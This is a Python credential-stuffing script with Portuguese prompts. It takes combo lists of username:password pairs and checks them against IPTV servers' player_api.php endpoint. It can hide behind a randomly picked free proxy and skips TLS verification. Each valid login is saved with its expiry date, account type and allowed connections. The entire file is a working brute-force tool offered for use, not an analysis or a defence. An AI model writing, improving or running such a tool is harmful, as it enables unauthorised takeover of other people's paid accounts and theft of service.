import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json
from datetime import datetime

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36'

    

def open_url(url,timeout=12,proxy=False):
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    headers = {'sec-ch-ua': '"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': UA,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'    
    }
    if proxy:
        http_proxy  = "http://%s"%str(proxy)
        #proxyDict = {"http": http_proxy, "https": "185.191.164.114:26691"}
        proxyDict = {"http": http_proxy}
        try:
            r = requests.get(url, headers=headers, proxies=proxyDict, verify=False, timeout=timeout)
            code = r.status_code
            content = r.text
            try:
                content = content.decode('utf-8')
            except:
                pass
        except:
            try:
                r = requests.get(url, headers=headers, proxies=proxyDict, verify=False, timeout=timeout)
                code = r.status_code
                content = r.text
                try:
                    content = content.decode('utf-8')
                except:
                    pass
            except:
                code = 404
                content = False
    else:
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=timeout)
            code = r.status_code
            content = r.text
            try:
                content = content.decode('utf-8')
            except:
                pass            
        except:
            code = 404
            content = False
    if code != 200:
        content = False
    return content


def obter_proxy():
    import random
    url_list = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=BR&ssl=no&anonymity=all'
    data = open_url(url_list,timeout=12)
    if data:
        list1 = data.splitlines()
        total1 = len(list1)
        number_http = random.randint(0,total1-1)
        proxy_http = list1[number_http]
    else:
        proxy_http = False        
    return proxy_http
    
    


def check_proxy(proxy):
    #url_check = 'http://api.ipify.org/'
    url_check = 'http://www.httpbin.org/ip'
    data = open_url(url_check,timeout=12,proxy=proxy)
    try:
        ip_proxy = proxy.split(':')[0]
    except:
        ip_proxy = False
    if data and ip_proxy:
        data = json.loads(data)
        origin = data.get('origin')
        try:
            ip_test = origin.split(', ')[1]
        except:
            ip_test = False
        if ip_proxy and ip_test:
            if ip_proxy == ip_test:
                print('Proxy Funcionando - ',ip_test)
            else:
                print('Proxy invalido')
        else:
            print('Proxy invalido')
    else:
        print('Proxy invalido')
        

def time_convert(timestamp):
    try:
        if timestamp > '':
            dt_object = datetime.fromtimestamp(int(timestamp))
            time_br = dt_object.strftime('%d/%m/%Y às %H:%M:%S')
            return str(time_br)
        else:
            valor = ''
            return valor
    except:
        valor = ''
        return valor


def check_iptv(server,username,password,proxy=False):
    iptv = '%s/player_api.php?username=%s&password=%s'%(str(server),str(username),str(password))
    data = open_url(iptv,timeout=12,proxy=proxy)
    if data:
        data = json.loads(data)
        try:
            user_info = data.get('user_info')
        except:
            user_info = False       
        if user_info:
            try:
                auth = user_info.get('auth')
            except:
                auth = False
            try:
                status = user_info.get('status')
            except:
                status = False
            try:
                exp_date = user_info.get('exp_date')
            except:
                exp_date = False
            try:
                created_at = user_info.get('created_at')
            except:
                created_at = False
            try:
                is_trial = user_info.get('is_trial')
            except:
                is_trial = False
            try:
                max_connections = user_info.get('max_connections')
            except:
                max_connections = False                
            if auth:
                if str(auth) == '1':
                    auth = True
                else:
                    auth = False
            else:
                auth = False            
            if status:
                if str(status) == 'Active':
                    status = True
                else:
                    status = False
            else:
                status = False
            if exp_date:
                if str(exp_date) == 'null':
                    exp_date = 'Infinito'
                else:
                    try:
                        exp_date = time_convert(str(exp_date))
                    except:
                        exp_date = 'Infinito'
            else:
                exp_date = 'Infinito'
            if created_at:
                try:
                    created_at = time_convert(str(created_at))
                except:
                    created_at = 'null'
            else:
                created_at = 'null'
            if is_trial:
                if str(is_trial) == '0':
                    is_trial = 'Pago'
                else:
                    is_trial = 'Demonstrativo'
            else:
                is_trial = 'Desconhecido'
            if max_connections:
                max_connections = str(max_connections)
            else:
                max_connections = 'Desconhecido'                
            
        else:
            auth = False
            status = False
            exp_date = 'Infinito'
            created_at = 'null'
            is_trial = 'Desconhecido'
            max_connections = 'Desconhecido'
    else:
        auth = False
        status = False
        exp_date = 'Infinito'
        created_at = 'null'
        is_trial = 'Desconhecido'
        max_connections = 'Desconhecido'
    return auth,status,exp_date,created_at,is_trial,max_connections


def start_brute_force(output,combo,server,proxy):
    with open(output, 'a', encoding='utf8') as f:
        with open(combo, 'r', encoding='utf8') as fc:
            for line in fc.readlines():
                line = line.replace('\n', '').replace('\r', '').replace(' ', '').replace('\ufeff', '')
                if ':' in line:
                    print('checking - ',str(line))
                    try:
                        username = line.split(':')[0]
                    except:
                        username = False
                    try:
                        password = line.split(':')[1]
                    except:
                        password = False
                    if username and password:
                        username = str(username)
                        password = str(password)
                        auth,status,exp_date,created_at,is_trial,max_connections = check_iptv(server,username,password,proxy)
                        if auth and status:
                            print('encontrado - ',str(line))
                            result = '############################################\n'
                            result += 'Server: %s\n'%str(server)
                            result += 'Usuario: %s\n'%str(username)
                            result += 'Senha: %s\n'%str(password)
                            result += 'Criado em: %s\n'%str(created_at)
                            result += 'Expira em: %s\n'%str(exp_date)
                            result += 'Tipo: %s\n'%str(is_trial)
                            result += 'Conexoes permitidas: %s\n'%str(max_connections)
                            result += '############################################\n'
                            f.write(result)
                            f.flush()
        fc.close()
    f.close()
    
px = input('Deseja usar proxy? (sim/nao): ')
if px == 'sim':
    proxy = obter_proxy()
    if proxy:
        print('Proxy Encontrado: ',proxy)
        px2 = input('Deseja testar o proxy? (sim/nao): ')
        if px2 == 'sim':
            check_proxy(proxy)
            px3 = input('Deseja ficar com o proxy? (sim/nao): ')
            if px3 != 'sim':
                proxy = False
else:
    proxy = False
save = input('Nome do Arquivo a ser salvo (exemplo - lista.txt): ')
if save > '' and '.txt' in save:
    combo = input('Nome do Arquivo combo a ser usado (exemplo - combo.txt): ')
    if combo > '' and '.txt' in combo:
        server = input('URL do Servidor IPTV (exemplo - http://127.0.0.1:80): ')
        if save > '' and combo > '' and server > '':
            start_brute_force(save,combo,server,proxy)